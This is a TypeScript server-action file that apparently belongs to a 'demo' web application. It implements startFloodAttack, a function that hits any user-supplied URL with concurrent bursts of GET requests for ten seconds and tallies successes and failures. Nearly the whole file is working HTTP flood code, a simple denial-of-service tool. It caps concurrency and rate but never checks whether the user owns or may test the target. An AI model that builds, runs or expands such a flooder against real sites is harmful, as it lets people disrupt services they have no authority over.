"use server";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
}

// Fixed duration for the flood attack for this demo application
const ATTACK_DURATION_SECONDS = 10;

export async function startFloodAttack(
  targetUrl: string,
  concurrency: number,
  rate: number // requests per second (RPS)
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Invalid target URL. Please include scheme (e.g., http:// or https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "Target URL must use http or https protocol." };
  }

  if (concurrency <= 0 || rate <= 0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Concurrency and rate must be positive integers." };
  }
  
  // Cap concurrency and rate server-side for safety in a demo app
  const safeConcurrency = Math.min(concurrency, 100);
  const safeRate = Math.min(rate, 100);

  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const startTime = Date.now();
  const endTime = startTime + ATTACK_DURATION_SECONDS * 1000;

  console.log(`Starting flood: ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${ATTACK_DURATION_SECONDS}s`);

  try {
    while (Date.now() < endTime) {
      const batchStartTime = Date.now();
      const requestsInBatch: Promise<void>[] = [];
      
      // Determine how many requests to send in this specific burst/iteration
      // to not exceed overall rate over time.
      // For simplicity, we send `safeConcurrency` requests per burst.
      const numRequestsThisBurst = safeConcurrency;

      for (let i = 0; i < numRequestsThisBurst; i++) {
        if (Date.now() >= endTime) break; // Check time before each request in burst

        requestsInBatch.push(
          fetch(targetUrl, { 
            method: 'GET', 
            signal: AbortSignal.timeout(5000) // Timeout for each request
          }) 
            .then(response => {
              if (response.ok || (response.status >= 200 && response.status < 400)) { // Consider 2xx and 3xx as success
                successful++;
              } else {
                failed++;
              }
            })
            .catch(() => {
              failed++;
            })
            .finally(() => {
              totalSent++;
            })
        );
      }
      
      await Promise.allSettled(requestsInBatch); // Use allSettled to ensure all complete

      if (Date.now() >= endTime) break;

      // Calculate delay to maintain rate:
      // We've sent `numRequestsThisBurst` requests.
      // These should ideally be spread over `numRequestsThisBurst / safeRate` seconds.
      // So, delay is `(numRequestsThisBurst / safeRate) * 1000` ms.
      // Subtract time taken by the batch itself.
      const batchDurationMs = Date.now() - batchStartTime;
      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
      
      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
      // If batch took longer than target interval, we're falling behind rate, no extra delay.
    }
  } catch (e: any) {
    console.error("Flood attack error:", e);
    return { totalSent, successful, failed, error: e.message || "An unexpected error occurred during the flood." };
  } finally {
    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}`);
  }

  return { totalSent, successful, failed };
}
